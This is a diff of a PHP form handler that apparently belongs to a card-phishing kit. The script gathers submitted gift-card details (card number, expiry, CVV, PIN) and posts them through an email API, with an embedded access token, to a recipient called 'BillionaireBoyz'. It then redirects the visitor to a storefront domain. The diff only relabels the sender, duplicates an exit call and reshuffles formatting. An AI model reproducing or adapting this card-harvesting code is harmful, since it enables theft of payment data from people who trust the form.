@@ -1,7 +1,7 @@
-
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "GET") {
     header('Location: https://mycardlysupply.store/');
+    exit;
     exit;
 };
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
@@ -71,25 +71,27 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         "accessToken": "2Ok9-WjSifXA4pIvRdLu-",
         "template_params": {
             "to_name":"BillionaireBoyz",
-            "from_name":"Cardly Supply Main",
+            "from_name":"Cardly Supply 1",
             "message": $email_card_data
         }
     }
     data;
 
-    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
-    $resp = curl_exec($curl);
-    curl_close($curl);
+$resp = curl_exec($curl);
+curl_close($curl);
 
-    if ($resp === false) {
-        header('Location: https://mycardlysupply.store/');
-    } else {
-        header('Location: https://mycardlysupply.store/');
-    };
-
+if ($resp === false) {
+    header('Location: https://mycardlysupply.store/');
 } else {
     header('Location: https://mycardlysupply.store/');
-    exit;
 };
+
+} else {
+header('Location: https://mycardlysupply.store/');
+exit;
+};
+
+
 ?>
